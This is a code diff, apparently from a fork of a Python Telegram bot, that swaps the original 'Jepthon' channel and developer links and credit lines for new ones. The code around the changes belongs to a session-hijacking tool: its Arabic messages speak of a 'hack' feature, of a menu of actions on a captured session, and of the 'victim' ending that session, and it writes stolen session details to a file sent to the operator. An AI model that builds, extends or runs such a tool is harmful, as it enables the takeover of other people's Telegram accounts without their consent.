@@ -218,7 +218,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("قناة السورس", "https://t.me/jepthon")
+    Button.url("قناة السورس", "https://t.me/egbbb")
     ]
 ]
 
@@ -237,7 +237,7 @@ async def op(event):
 async def op(event):
     Jepthon = [
     [
-      Button.url("اضغط هنا", f"https://t.me/JEPTHON/932")
+      Button.url("اضغط هنا", f"https://t.me/egbbb")
       ]
     ]         
     await event.reply("لأستخدام ميزة اختراق كود تيرمكس الخاص بسورس جيبثون يجب عليك ان تنصب السورس اولاً", buttons=Jepthon)
@@ -268,7 +268,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("المطور", "https://t.me/lMl10l")
+        Button.url("المطور", "https://t.me/egbbb")
         ]
     ]
     await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -290,12 +290,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @Jepthon")
+        file.write(i + "\n\nDetails BY @egbbb")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس جيبثون ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس لندا ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 @check_owner
@@ -339,7 +339,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس جيبثون", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس لندا", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
